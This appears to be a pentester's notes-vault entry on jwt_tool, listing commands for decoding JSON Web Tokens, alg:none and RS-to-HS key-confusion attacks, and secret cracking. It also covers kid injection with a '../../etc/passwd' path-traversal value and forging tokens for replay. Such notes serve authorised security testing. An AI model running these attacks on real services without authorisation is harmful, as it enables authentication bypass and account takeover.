---
title: "jwt_tool"
type: tool
tags: [jwt, authentication, web, api, cracking]
date_created: 2026-07-03
date_updated: 2026-07-03
sources: []
phase: crack
---

## Purpose

**jwt_tool** tests JSON Web Tokens end to end: decode and tamper claims, run signature attacks (alg:none, RS/HS key confusion, kid injection), and crack weak HMAC secrets.

## Install / setup

```bash
git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool && pip install -r requirements.txt
```

## Core usage

```bash
jwt_tool <JWT>                                        # decode + inspect claims
jwt_tool <JWT> -X a                                    # alg:none exploit
jwt_tool <JWT> -X k -pk public.pem                     # RS -> HS key confusion
jwt_tool <JWT> -C -d rockyou.txt                       # crack the HMAC secret
jwt_tool <JWT> -T                                       # interactive tamper mode
```

## Common use cases

```bash
jwt_tool <JWT> -X i -I -pc kid -pv "../../etc/passwd"  # kid injection (LFI/SQLi)
jwt_tool <JWT> -X s                                     # signature strip / null-sig
# forge a token after cracking or key confusion, then replay in an authed request
```

## Tips and gotchas

- RS to HS confusion needs the server's public key (often `/jwks.json` or the TLS cert).
- Always confirm the server actually validates the signature before claiming a bypass.
- For pure GPU cracking of HS256 secrets, [[hashcat]] `-m 16500` is much faster.
- Full attack matrix and defences in [[jwt]] / [[jwt-attacks]].

## Related techniques

[[jwt]], [[jwt-attacks]], [[hashcat]]

## Sources

Vault-resident; ticarpi/jwt_tool docs.
